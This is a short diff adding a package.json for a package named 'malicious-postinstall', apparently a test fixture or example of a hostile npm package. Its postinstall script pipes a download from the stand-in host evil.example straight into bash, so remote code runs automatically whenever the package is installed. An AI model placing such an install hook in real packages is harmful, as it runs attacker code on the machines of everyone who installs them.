@@ -1,0 +1,7 @@
+{
+  "name": "malicious-postinstall",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://evil.example/install.sh | bash"
+  }
+}
